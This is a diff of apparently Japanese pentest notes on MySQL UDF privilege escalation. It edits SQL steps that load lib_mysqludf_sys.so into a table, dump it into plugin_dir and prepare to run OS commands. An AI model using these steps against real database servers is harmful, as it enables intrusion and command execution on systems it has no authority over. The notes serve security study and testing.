@@ -145,7 +145,7 @@ SELECT table_name, column_name, table_schema FROM information_schema.columns WHE
 
 - [ ] todo:claudeみて修整
 
-1. UDF ライブラリをバイナリ（または16進数）でテーブルに流し込む
+1. UDFライブラリをバイナリ（または16進数）でテーブルに流し込む
 ```sql
 USE mysql;
 CREATE TABLE npn(line blob);
@@ -154,10 +154,10 @@ INSERT INTO npn VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
 
 2. ライブラリを `plugin_dir` へ出力する
 ```sql
--- plugin_dirの確認
+-- plugin_dirの事前確認
 SELECT @@plugin_dir;
 
-SELECT * FROM npn INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+SELECT * FROM npn INTO DUMPFILE '<plugin_dir_path>/lib_mysqludf_sys.so';
 ```
 
 3. 関数を作成し、OSコマンドを実行する
